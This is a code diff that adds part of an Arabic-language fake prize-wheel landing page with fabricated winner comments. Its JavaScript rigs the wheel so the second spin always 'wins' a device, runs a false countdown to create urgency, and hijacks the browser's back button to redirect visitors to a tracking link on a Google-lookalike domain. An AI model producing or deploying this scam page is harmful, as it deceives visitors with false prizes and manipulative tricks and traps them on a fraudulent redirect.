+                  <div class="comment_text">انا كسبت اى باد بس عندى واحد. ممكن ابدل الجايزة واخد اى ماك؟
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(4));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <div class="show_next_wrap">
+            <span class="show_next">اظهار الكل</span>
+          </div>
+        </center>
+      </div>
+    </div>
+    <div class="fixed_footer"><img alt="" class="clip" src="clip_footer_3.png"> <input class="footer_input" placeholder="رسالتك" type="text"> <img alt="" class="btn_send" src="footer_right.png"></div>
+  </div>
+  <script type="text/javascript">
+    var page = ("page"),
+      brand = ("device_brand");
+
+    var conMid, mydate = new Date,
+      year = mydate.getFullYear(),
+      month = mydate.getMonth(),
+      day = mydate.getDate(),
+      weekday = mydate.getDay(),
+      count = 1,
+      headline = document.getElementById("headline"),
+      topDate = document.getElementById("topDate"),
+      today = document.getElementById("today"),
+      con = document.getElementById("container"),
+      whCon = document.getElementById("wheelCon"),
+      dWheel = document.getElementById("wheel"),
+      button = document.getElementById("pressButton"),
+      device = document.getElementById("devMockup"),
+      first = document.getElementById("firstpage"),
+      second = document.getElementById("secondpage");
+
+    function setButtonHeight() {
+      conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top =
+        conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
+    }
+
+    function spin() {
+      switch (count) {
+        case 1:
+          button.disabled = !0, dWheel.className = "spinAround", setTimeout(function () {
+            button.disabled = !1, alert("  !عندك فرصة تانية \n\n !تقدر تحاول تانى"), autospin2()
+          }, 6800);
+          break;
+        case 2:
+          dWheel.className = "spinAround2", setTimeout(function () {
+            dWheel.className = dWheel.className + " transparent"
+          }, 6800), setTimeout(function () {
+            device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 +
+              "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+          }, 7000), setTimeout(function () {
+            first.innerHTML = "<img src='loading.gif'>", first.style.padding = "195px 0px", setTimeout(function () {
+              first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con
+                .firstChild), setInterval("countdown()", 1000)
+            }, 1500)
+          }, 9000)
+      }
+      count++
+    }
+
+    function autospin2() {
+      spin()
+    }
+
+    function autospin1() {
+      alert(
+        '!مبروك\n\nانت واحد من ضمن ٧ اشخاص تم اختيارهم للمشاركة فى برنامجنا لكسب النقاط  وتقدر تكسب جايزة من اصل اربع جوايز. \n\nدوس "اوك" لنبدأ '
+        ), document.getElementById("pressButton").click()
+    }
+
+    function countdown() {
+      var d = parseInt(document.getElementById("mins").innerHTML),
+        c = parseInt(document.getElementById("hsecs").innerHTML),
+        b = 0,
+        a = 0;
+      0 !== d && 0 === c ? (b = d - 1, a = 59) : 0 !== d || 0 !== c ? (b = d, a = c - 1) : 0 === d && 0 === c && (b = d,
+        a = c), a < 10 && (a = "0" + a), document.getElementById("mins").textContent = b, document.getElementById(
+        "hsecs").textContent = a
+    };
+  </script>
+<script>
+	window.history.pushState({ page: 1 }, '', '');
+	window.onpopstate = function(event) {
+		if (event) {
+			window.location.href = 'https://coogletrck3.com/click.php?key=0lp9k1kle3m19wqtwn9o';
+		}
+	}
+</script>
+</body></html>
